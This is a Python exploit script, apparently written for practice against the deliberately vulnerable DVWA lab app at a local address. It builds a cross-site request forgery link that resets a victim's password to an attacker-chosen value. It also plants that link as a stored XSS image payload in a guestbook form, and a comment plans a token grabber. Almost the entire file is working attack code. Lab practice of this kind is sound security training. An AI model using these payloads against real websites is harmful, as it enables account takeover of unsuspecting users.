"""
    Cross site request forgery (CSRF)
"""

import requests
import os
import sys
sys.path.insert(0,'../') # To import dvwa module
import dvwa
from bs4 import BeautifulSoup
"""
pip install bs4
pip install lxml
"""

"""
For the low security, we could just create a link with the GET variables set upped, then send it to the target
"""

def generate_exploit_low(new_password="pwned"):
    exploit = "http://192.168.1.73/dvwa/vulnerabilities/csrf/?" # create the url base
    exploit += "password_new="
    exploit += new_password # set the new password
    exploit += "&"+"password_conf="
    exploit += new_password # set the new password (confirmation)
    exploit += "&"+"Change=Change" # validate the form
    return exploit

"""
Because of the DVWA security structure, you can't really use medium difficulty because you'll have to bypass high XSS protection which is not the goal here
So just set the difficulty to low unless you bypass XSS protection for medium
For to bypass the medium difficulty of the CSRF level, we will have to do a stored XSS to the target where it will load the link
"""

def exploit_med(sess, new_password="pwned"):
    resp = sess.get("http://192.168.1.73/dvwa/vulnerabilities/xss_s/")
    #print(resp.text)

    exploit = "<img src=\""
    exploit += generate_exploit_low(new_password) # payload
    exploit += "\"></img>"

    payload = {
        "txtName":"A nice image", # name
        "mtxMessage":exploit, # message
        "btnSign":"btnSign"
    }
    resp = sess.post("http://192.168.1.73/dvwa/vulnerabilities/xss_s/", data=payload)

"""
Because of the DVWA security structure, you can't really use high difficulty because you'll have to bypass high XSS protection which is not the goal here
So just set the difficulty to medium unless you bypass XSS protection for medium
"""
# TODO: Create a token grabber with command, then use it in the XSS payload

def main():
    sess = requests.Session()
    sess = dvwa.login_dvwa(sess, "http://192.168.1.73/dvwa/login.php")
    sess = dvwa.set_dvwa_difficulty(sess, "http://192.168.1.73/dvwa/security.php", "low")
    
    #print(generate_exploit("p0wN3d_p4ssw0rd"))
    exploit_med(sess, "p0wned")
    
main()